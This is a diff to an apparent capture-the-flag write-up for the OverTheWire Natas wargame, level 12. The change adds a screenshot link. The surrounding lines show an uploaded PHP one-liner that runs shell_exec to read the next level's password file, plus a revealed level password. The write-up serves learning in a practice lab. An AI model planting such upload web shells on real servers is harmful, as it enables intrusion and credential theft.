@@ -54,6 +54,9 @@ Lets upload script.php
 <!-- You can use find command to find the password for this level but I expect that they are in the same dir -->
 <? echo shell_exec('cat /etc/natas_webpass/natas13'); ?>
 ```
+
+![Capture](https://github.com/Reda-BELHAJ/OverTheWire/blob/main/Natas/Captures/Capture5.PNG)
+
 ```
 The password for natas12 is jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 ```
